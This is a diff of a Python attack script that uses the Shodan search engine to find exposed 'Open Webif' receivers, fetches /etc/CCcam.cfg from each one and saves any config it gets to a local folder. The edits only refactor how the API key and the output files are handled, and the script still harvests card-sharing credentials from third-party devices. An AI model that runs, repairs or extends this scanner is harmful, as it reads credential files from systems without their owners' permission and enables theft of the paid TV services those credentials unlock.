@@ -12,7 +12,13 @@ import requests
 from time import sleep
 
 # Configuration
-API_KEY = "YOURSHODANAPIKEY"
+import os
+import sys
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from common import get_api_key, open_output
+
+API_KEY = get_api_key()
 SEARCH_FOR = "title:'Open Webif'"
 FILE = "/etc/CCcam.cfg"
 session = requests.Session()
@@ -42,7 +48,7 @@ def grab_file (IP,PORT,FILE):
 		result = response.text
 		if "not found" not in result:
 			details = filter_result(result)
-			text_file = open("./cfg/"+IP+"-CCcam.cfg", "a")
+			text_file = open_output("cfg/"+IP+"-CCcam.cfg", "a")
 			text_file.write(""+result+"\n")
 			text_file.close()
 			print ("[*] OOOOH we have a CCcam config... [*]\n")
